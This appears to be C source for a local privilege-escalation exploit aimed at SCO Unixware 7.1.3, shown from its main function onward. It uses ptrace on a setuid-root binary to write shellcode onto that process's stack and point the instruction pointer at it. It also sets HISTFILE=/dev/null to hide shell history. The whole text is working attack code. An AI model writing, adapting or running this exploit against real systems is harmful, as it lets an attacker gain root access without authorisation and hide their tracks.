int main(int argc,char* argv[])
{
int esp, eip, i = 0;
struct user_regs_struct regs;
char *env[] = {"HISTFILE=/dev/null",NULL};
pid_t pid;
printf("[ SCO Unixware 7.1.3 local root exploit\n");
if(argc < 2)
{
printf("[ Usage: [binary]\n");
printf("[ e.g -rwsr-sr-x root root /linux/opt/kde2/bin/kcheckpass\n");
exit(0);
}
switch (pid = fork())
{
case -1:
perror("fork");
break;
case 0: 
ptrace(PTRACE_TRACEME, 0, 0, 0); 
pid = getpid();
execle(argv[1],argv[1],NULL,env); 
break;
default: 
waitpid(pid, NULL, 0); 
ptrace(PTRACE_GETREGS, pid, NULL, &regs);
esp = eip = regs.esp - 512;
while (i < strlen(shellcode)) 
{
ptrace(PTRACE_POKETEXT, pid, esp, (int) *(int *) (shellcode + i));
i += 4;
esp += 4;
}
regs.eip = (long) eip;
printf("[ Using 0x%x\n",regs.eip); 
ptrace(PTRACE_SETREGS, pid, NULL, &regs);
ptrace(PTRACE_DETACH, pid, NULL,NULL);
}
usleep(1);
wait(0);
return 0;
}